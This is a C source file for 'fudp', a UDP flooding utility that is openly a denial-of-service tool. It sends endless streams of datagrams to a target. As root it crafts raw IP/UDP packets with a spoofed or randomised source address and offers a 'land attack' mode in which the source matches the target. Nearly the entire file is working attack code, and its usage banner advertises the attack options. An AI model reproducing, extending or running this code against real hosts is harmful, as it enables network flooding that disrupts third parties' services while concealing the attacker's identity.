/*
** Simple udp flooding utility with some nice features, like source ip
** spoofing, land udp attack mode, and others.
** Copyright (C) 2005-2006 urug.projects@gmail.com
**
** This program is free software; you can redistribute it and/or modify it
** under the terms of the GNU General Public License as published by the
** Free Software Foundation; either version 2 of the License, or (at your
** option) any later version.
**
** This program is distributed in the hope that it will be useful, but
** WITHOUT ANY WARRANTY; without even the implied warranty of
** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General
** Public License for more details.
**
** You should have received a copy of the GNU General Public License along
** with this program; if not, write to the Free Software Foundation, Inc.,
** 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
*/

#include "network_flooding.h"



/*
** Parse command line args.
*/
int
main( int argc, char **argv )
{
    MODES		startup;
    struct sockaddr_in	caddr;
    struct hostent	*dns = NULL;
    static int		c, salarm, dport;


    prepare_modes(&startup);

    while( (c = getopt(argc, argv, "1p:z:t:rs:l")) > -1 )
        switch(c)
        {
            case '1': startup.one = TRUE;
                      break;
            case 'p': dport = atoi(optarg);
                      startup.rdport = FALSE;
                      break;
            case 'z': if( (startup.size = atoi(optarg) ) > 100 )
                      {
                          printf("Datagram data too long (max 100 bytes)\n");
                          return 1;
                      }

                      break;
            case 't': salarm = atoi(optarg);
                      break;
            case 'r': startup.rsource = TRUE;
                      startup.ssource = FALSE;
                      startup.land = FALSE;
                      break;
            case 's': strncpy(startup.source, optarg, sizeof(startup.source));
                      startup.ssource = TRUE;
                      startup.rsource = FALSE;
                      startup.land = FALSE;
                      break;
            case 'l': startup.land = TRUE;
                      startup.ssource = FALSE;
                      startup.rsource = FALSE;
                      break;
            case '?': default: exit(1);
        }

    if( argc - optind < 1 || argc - optind > 1 )
        banner(argv[0]);
    else if( (dns = gethostbyname(argv[optind])) == NULL )
    {
	herror(argv[optind]);
	return 1;
    }

    /* Set alarm */
    if( salarm != 0 )
	alarm(salarm);

    /* seed new sequence of pseudo-random integers to be returned by rand() */
    srand(time(NULL));

    /* Fill caddr struct. */
    caddr.sin_family = dns->h_addrtype;
    memcpy(&caddr.sin_addr, *dns->h_addr_list, dns->h_length );
    caddr.sin_port = htons(dport);

    /* Start sending datagrams. */
    if( startup.rsource || startup.ssource || startup.land )
	sendto_root(&caddr, sizeof(caddr), &startup);
    else
	sendto_nonroot(&caddr, sizeof(caddr), &startup);

    return 0;
}



/*
** Send datagrams without source spoof.
*/
void
sendto_nonroot( struct sockaddr_in *caddr, socklen_t caddr_len, MODES *modes )
{
    char	packet[100];
    int		sock, i;


    if( (sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1 )
    {
        perror("socket()");
	return;
    }

    /* Prepare datagram data. */
    for( i = 0; i <= modes->size ; i++ )
	 packet[i] = 'z';

    do
    {
        if( modes->rdport )
	    caddr->sin_port = htons(rand()%65535);

        sendto(sock, packet, modes->size, 0, (struct sockaddr *)caddr, caddr_len );
    }
    while( !modes->one );
}



/*
** Send datagrams with source spoof.
*/
void
sendto_root( struct sockaddr_in *caddr, socklen_t caddr_len, MODES *modes )
{
    struct udphdr	udphdr;
    struct ip		iphdr;
    char		packet[128], *p;
    int			i, sock, dgsize;


    if( (sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW )) == -1 )
    {
        perror("socket()");
        return;
    }

    /* Write IP header. */
    iphdr.ip_hl = 5;
    iphdr.ip_v = 4;
    iphdr.ip_tos = 0x0;
    iphdr.ip_id = htons(1);
    iphdr.ip_off = 0;
    iphdr.ip_ttl = 64;
    iphdr.ip_p = IPPROTO_UDP;
    memcpy((char *)&iphdr.ip_dst.s_addr, &caddr->sin_addr.s_addr, sizeof(caddr->sin_addr.s_addr));
    iphdr.ip_sum = in_cksum((u_short *)&iphdr, sizeof(iphdr));
    iphdr.ip_len = htons(sizeof(iphdr) + sizeof(udphdr) + modes->size);
    if( modes->ssource )
        iphdr.ip_src.s_addr = inet_addr(modes->source);

    /* Write UDP header. */
    udphdr.uh_sum = 0;
    udphdr.uh_ulen = htons(sizeof(udphdr) + modes->size);
    udphdr.uh_dport = caddr->sin_port;
    udphdr.uh_sport = htons(rand()%65535);

    /* Land attack need same sport and source host as targets. */
    if( modes->land )
    {
        memcpy((char *)&iphdr.ip_src.s_addr, &caddr->sin_addr.s_addr, sizeof(caddr->sin_addr.s_addr));
	udphdr.uh_sport = udphdr.uh_dport;
    }

    /* Write datagram */
    memcpy(packet, &iphdr, sizeof(iphdr));
    p = &packet[sizeof(iphdr)];
    memcpy(p, &udphdr, sizeof(udphdr));
    p = &packet[sizeof(iphdr) + sizeof(udphdr)];
    for( i = 0; i <= modes->size ; i++ )
	*p++ = 'z';

    /* Datagram size */
    dgsize = sizeof(udphdr) + sizeof(iphdr) + modes->size;

    do
    {
	if( modes->rsource )
	{
	    iphdr.ip_src.s_addr = rand();
	    memcpy(packet, &iphdr, sizeof(iphdr));
        }

	if( modes->rdport || modes->rsource )
	{
	    if( modes->rdport )
	        udphdr.uh_dport = htons(rand()%65535);

            if( modes->land )
	        udphdr.uh_sport = udphdr.uh_dport;
            else
                udphdr.uh_sport = htons(rand()%65535);

            memcpy(&packet[sizeof(iphdr)], &udphdr, sizeof(udphdr));
        }

	sendto(sock, packet, dgsize, 0, (struct sockaddr *)caddr, caddr_len);
    }
    while( !modes->one );
}



/*
** Count packet checksum.
*/
u_short
in_cksum( u_int16_t *addr, int len )
{
    int		nleft = len;
    u_int16_t	*w = addr;
    u_int32_t	sum = 0;
    u_int16_t	answer = 0;


    /*
    * Our algorithm is simple, using a 32 bit accumulator (sum), we add
    * sequential 16 bit words to it, and at the end, fold back all the
    * carry bits from the top 16 bits into the lower 16 bits.
    */
    while( nleft > 1 )
    {
	sum += *w++;
	nleft -= 2;
    }

    /* mop up an odd byte, if necessary */
    if( nleft == 1 )
    {
        answer=0;
        *(u_char *)(&answer) = *(u_char *)w ;
        sum += answer;
    }

    /* add back carry outs from top 16 bits to low 16 bits */
    sum = (sum >> 16) + (sum & 0xffff);     /* add hi 16 to low 16 */
    sum += (sum >> 16);                     /* add carry */
    answer = ~sum;                          /* truncate to 16 bits */
    return answer;
}



/*
** Preapres MODES struct, e.g. clear all values, and set some default.
*/
void
prepare_modes( MODES *junk )
{
    memset(junk, 0, sizeof(MODES));

    /* Set some default values */
    junk->size = 10;
    junk->rdport = TRUE;
}



/*
** Print help.
*/
void
banner( char *name )
{
    printf("Usage: %s [-1pztrsl] <target>\n\n"\
           "flags:\n"\
           "\t-1\t\t:: send one dgram and exit\n"\
           "\t-p <port>\t:: destination port (by default random for each dgram)\n"\
           "\t-z <size>\t:: dgram data length (default 10)\n"\
           "\t-t <time>\t:: fudp life time (in seconds)\n\n"\
           "only root:\n"\
           "\t-r\t\t:: random source IP for each dgram\n"\
           "\t-s <source>\t:: set source IP\n"\
           "\t-l\t\t:: land attack\n\n"\
           "fudp-%s by urug.projects(at)gmail.com\n"\
           "Please report bugs on https://sourceforge.net/projects/usoft/\n",
           name, VERSION);

    exit(1);
}
